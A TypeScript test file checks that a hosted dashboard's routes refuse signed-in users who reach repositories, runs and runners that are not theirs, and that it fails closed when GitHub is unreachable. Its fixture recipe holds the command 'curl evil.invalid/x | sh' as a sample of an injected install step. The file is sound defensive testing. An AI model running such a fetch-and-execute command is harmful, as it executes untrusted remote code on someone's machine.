// Being signed in is not being allowed (9c).
//
// The write on this surface stores shell commands the engine later executes verbatim in
// a sandbox with a package registry reachable (ADR-0013). Locally that is safe because
// there is one operator on 127.0.0.1. Hosted on a public address, an unauthorized POST
// here is remote code execution on somebody else's runner — so every case below is a
// person who IS signed in, trying to reach a repository that is not theirs.
//
// The authorization answer comes from GitHub (`GET /user/installations`), which is why
// both halves are injected here: what is under test is the gate, not the API client.

import { describe, expect, it, vi } from 'vitest';
import type { Db } from '../src/store.js';
import type { Session } from '../src/auth.js';
import { dashboardRoutes } from '../src/routes.js';

const SESSION: Session = { id: 's', githubId: 1, login: 'divy97', avatarUrl: '', token: 'ghu' };

/** Answers the lookups the surface makes, and records every write. */
const fakeClient = (writes: string[] = []) =>
  ({
    // Params, not just SQL: `readRunRow` filters by `where run_id = $1`, and a fake that
    // ignores the parameter answers every lookup with the first row — which made a test
    // about seeing somebody else's run pass by handing back your own.
    query: vi.fn(async (sql: string, params?: unknown[]) => {
      writes.push(sql);
      const wanted = sql.includes('where run_id = $1') ? String(params?.[0] ?? '') : null;
      const rows =
        sql.includes('from installations')
          ? [
              { repo: 'mine/repo', installation_id: 1, account: 'me', connected_at: new Date(), removed_at: null },
              { repo: 'theirs/repo', installation_id: 2, account: 'them', connected_at: new Date(), removed_at: null },
            ]
          : sql.includes('from run_projection')
            ? [
                { run_id: 'r-mine', repo: 'mine/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 7, thread_ref: 'mine/repo#1' },
                { run_id: 'r-theirs', repo: 'theirs/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 8, thread_ref: 'theirs/repo#1' },
              ].filter((row) => wanted === null || row.run_id === wanted)
            : [];
      return { rows, rowCount: rows.length };
    }),
  }) as unknown as Db;

/** A surface where this person can see installation 1 and nothing else. */
const surface = (options: { session?: Session | null; installations?: number[]; writes?: string[] } = {}) =>
  dashboardRoutes({
    client: fakeClient(options.writes),
    installUrl: 'https://example.invalid',
    auth: {
      session: async () => (options.session === undefined ? SESSION : options.session),
      installations: async () => options.installations ?? [1],
    },
  });

const call = (
  route: ReturnType<typeof dashboardRoutes>,
  method: string,
  path: string,
  body = '',
) =>
  route({
    method,
    path,
    query: new URLSearchParams(),
    headers: {},
    body: async () => body,
    raw: async () => Buffer.from(body),
  });

const RECIPE = new URLSearchParams({
  recipe: JSON.stringify({ install: 'curl evil.invalid/x | sh', services: [] }),
}).toString();

describe('a stranger is sent to the door', () => {
  it.each([['/repos'], ['/runs'], ['/runs/r-mine'], ['/repos/mine%2Frepo/onboard']])(
    'anonymous %s goes to sign in rather than rendering',
    async (path) => {
      const response = await call(surface({ session: null }), 'GET', path);
      expect(response?.status).toBe(302);
      expect(response?.headers?.['location']).toBe('/auth/github');
    },
  );

  it('an anonymous API request is told plainly, not redirected', async () => {
    // A redirect to an HTML login page is a 200 full of markup as far as a client is
    // concerned, and that is how "not signed in" becomes "the API returned garbage".
    const response = await call(surface({ session: null }), 'GET', '/api/runs');
    expect(response?.status).toBe(401);
  });

  it('an anonymous approval stores nothing', async () => {
    const writes: string[] = [];
    const response = await call(surface({ session: null, writes }), 'POST', '/repos/mine%2Frepo/onboard', RECIPE);
    expect(response?.status).toBe(302);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
  });
});

describe('being signed in is not being allowed', () => {
  it('THE test: approving for a repository you cannot see stores nothing', async () => {
    // Signed in, valid session, correct origin — and installation 2 is not theirs. If
    // this passes, the recipe is stored and the next run on that repository executes
    // `curl evil.invalid/x | sh` on somebody else's machine.
    const writes: string[] = [];
    const response = await call(surface({ writes }), 'POST', '/repos/theirs%2Frepo/onboard', RECIPE);

    expect(response?.status).toBe(404);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
  });

  it('and approving for one you CAN see is stored, so the refusal is not blanket', async () => {
    // The control. Without it the test above passes on a surface that refuses
    // everything, which is a working authorization check and a broken product.
    const writes: string[] = [];
    const response = await call(surface({ writes }), 'POST', '/repos/mine%2Frepo/onboard', RECIPE);

    expect(response?.status).toBe(303);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
  });

  it('the onboarding page of a repository you cannot see is not found', async () => {
    const response = await call(surface(), 'GET', '/repos/theirs%2Frepo/onboard');
    expect(response?.status).toBe(404);
    // "Not connected", the same words an unknown repository gets. A stranger probing
    // names learns nothing about which ones this service knows.
    expect(String(response?.body)).toContain('is not connected');
  });

  it('the repository list shows theirs and not the other one', async () => {
    const response = await call(surface(), 'GET', '/repos');
    expect(String(response?.body)).toContain('mine/repo');
    expect(String(response?.body)).not.toContain('theirs/repo');
  });

  it('a run belonging to another installation is not found', async () => {
    const response = await call(surface(), 'GET', '/runs/r-theirs');
    expect(response?.status).toBe(404);
  });

  it('and the run list carries only what they may see', async () => {
    const response = await call(surface(), 'GET', '/api/runs');
    const rows = JSON.parse(String(response?.body)) as { repo: string }[];
    expect(rows.map((row) => row.repo)).toEqual(['mine/repo']);
  });

  it('deleting the evidence of a run you cannot see deletes nothing', async () => {
    // 9e's write. Destroying somebody's evidence is not a lesser thing to be allowed to
    // do than reading it, so it goes through the same gate as the run's own page.
    const writes: string[] = [];
    const route = dashboardRoutes({
      client: fakeClient(writes),
      installUrl: 'https://example.invalid',
      blobRoot: '/tmp/never-used-because-this-is-refused',
      auth: { session: async () => SESSION, installations: async () => [1] },
    });
    const response = await call(route, 'POST', '/runs/r-theirs/forget');

    expect(response?.status).toBe(404);
    expect(writes.some((sql) => sql.includes('insert into forgotten'))).toBe(false);
  });

  it('revoking a runner by id does not reach another installation s machine', async () => {
    // The IDOR this closes: the gate authorized `mine/repo` in the path and the runner
    // id came from the URL unchecked, so a valid session on any repository could revoke
    // any machine whose id it knew. The fake below records the SQL, and the assertion is
    // that the update is scoped rather than that it happened.
    const writes: string[] = [];
    const response = await call(surface({ writes }), 'POST', '/repos/mine%2Frepo/runners/somebody-elses-id/revoke');

    // Nothing matched, so nothing was revoked, and the answer is the one a runner that
    // does not exist gets.
    expect(response?.status).toBe(404);
    const revokes = writes.filter((sql) => sql.includes('set revoked_at'));
    expect(revokes).toHaveLength(1);
    expect(revokes[0]).toContain('installation_id = $2');
  });

  it('a GitHub that will not answer denies rather than admits', async () => {
    // `installationsFor` returns an empty list when GitHub is unreachable, and this is
    // what that means at the surface: an outage must not become an authorization.
    const writes: string[] = [];
    const response = await call(
      surface({ installations: [], writes }),
      'POST',
      '/repos/mine%2Frepo/onboard',
      RECIPE,
    );
    expect(response?.status).toBe(404);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
  });
});

describe('the local surface is unchanged', () => {
  it('with no auth configured, nothing is gated', async () => {
    // ADR-0013's original shape: one operator, 127.0.0.1, the origin check is the
    // control. `serve.ts` still runs exactly this, and 9c must not have quietly
    // required a GitHub login to use your own laptop.
    const writes: string[] = [];
    const local = dashboardRoutes({ client: fakeClient(writes), installUrl: 'https://example.invalid' });
    const response = await call(local, 'POST', '/repos/theirs%2Frepo/onboard', RECIPE);

    expect(response?.status).toBe(303);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
  });
});

/**
 * The front door, which for a while was the one page that never asked.
 *
 * Every other route here calls `visible(headers)` first. `/` did not — it rendered the
 * landing page for everyone and decided the sign-in link from `options.auth !== undefined`,
 * which answers "is login configured on this deployment", not "is this person logged
 * out". So a signed-in user who typed the bare hostname was shown a marketing page
 * offering them a sign-in they had already done, with no link to their own repositories.
 *
 * Nothing was broken underneath: the session was valid and `/repos` worked. The page
 * simply never looked, which is the kind of bug a test of the routes it DID gate cannot
 * find.
 */
describe('the landing page asks who you are', () => {
  it('a signed-in visitor is sent to their repositories, not offered a sign-in', async () => {
    const response = await call(surface(), 'GET', '/');

    expect(response?.status).toBe(302);
    expect(response?.headers?.location).toBe('/repos');
  });

  it('a signed-in visitor with no installations still goes to /repos, which is where the answer is', async () => {
    // Not a special case worth its own page: `/repos` is precisely the page that says
    // "you have not installed this anywhere yet".
    const response = await call(surface({ installations: [] }), 'GET', '/');

    expect(response?.status).toBe(302);
    expect(response?.headers?.location).toBe('/repos');
  });

  it('a signed-out visitor gets the landing page WITH a way in', async () => {
    const response = await call(surface({ session: null }), 'GET', '/');

    expect(response?.status).toBe(200);
    expect(response?.body).toContain('href="/auth/github"');
  });

  it('and locally, where there is no login, the landing page offers none', async () => {
    // The original reason the line was written the way it was, and it still holds:
    // one operator on 127.0.0.1, and a sign-in button would lead nowhere.
    const local = dashboardRoutes({ client: fakeClient(), installUrl: 'https://example.invalid' });
    const response = await call(local, 'GET', '/');

    expect(response?.status).toBe(200);
    expect(response?.body).not.toContain('href="/auth/github"');
  });
});
